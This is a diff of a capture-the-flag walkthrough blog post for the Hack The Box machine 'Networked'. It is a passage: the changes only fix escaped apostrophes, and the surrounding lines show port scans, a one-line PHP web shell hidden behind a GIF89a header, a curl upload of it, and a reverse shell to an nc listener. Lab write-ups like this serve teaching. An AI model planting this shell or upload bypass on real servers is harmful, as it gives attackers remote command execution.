@@ -42,7 +42,7 @@ Discovered open port 80/tcp on 10.10.10.146
 Discovered open port 22/tcp on 10.10.10.146
 ```
 
-Nothing unsual with the open ports. Let\'s do one better with `nmap` scanning the discovered ports to establish their services.
+Nothing unsual with the open ports. Let's do one better with `nmap` scanning the discovered ports to establish their services.
 
 ```
 # nmap -n -v -Pn -p22,80 -A --reason -oN nmap.txt 10.10.10.146
@@ -66,7 +66,7 @@ Looks like we have only the `http` service to explore. Here's what it looks like
 ![7759278b.png](/assets/images/posts/networked-htb-walkthrough/7759278b.png)
 </a>
 
-I\'ve no idea what it means. Well, moving on to the next step.
+I've no idea what it means. Well, moving on to the next step.
 
 ### Directory/File Enumeration
 
@@ -101,7 +101,7 @@ The directory `/backup` sure looks interesting.
 ![665e6cf9.png](/assets/images/posts/networked-htb-walkthrough/665e6cf9.png)
 </a>
 
-Let\'s download it and see what\'s inside.
+Let's download it and see what's inside.
 
 <a class="image-popup">
 ![d50974c8.png](/assets/images/posts/networked-htb-walkthrough/d50974c8.png)
@@ -144,7 +144,7 @@ GIF89a
 <pre><?php echo shell_exec($_GET[0]); ?></pre>
 ```
 
-Let\'s give it a shot.
+Let's give it a shot.
 
 ```
 # curl -F "myFile=@cmd.php.gif;type=image/gif" -F "submit=go" http://10.10.10.146/upload.php
@@ -239,7 +239,7 @@ Three minutes later, a reverse shell as `guly` appears in my `nc` listener.
 ![a23e4e9b.png](/assets/images/posts/networked-htb-walkthrough/a23e4e9b.png)
 </a>
 
-Let\'s [upgrade](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/) our shell to full TTY.
+Let's [upgrade](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/) our shell to full TTY.
 
 The file `user.txt` is at `guly`'s home directory.
 
@@ -249,7 +249,7 @@ The file `user.txt` is at `guly`'s home directory.
 
 ### Getting `root.txt`
 
-During enumeration of `guly`\'s account, I notice `guly` is able to run the following command as `root` without password.
+During enumeration of `guly`'s account, I notice `guly` is able to run the following command as `root` without password.
 
 <a class="image-popup">
 ![f1268379.png](/assets/images/posts/networked-htb-walkthrough/f1268379.png)
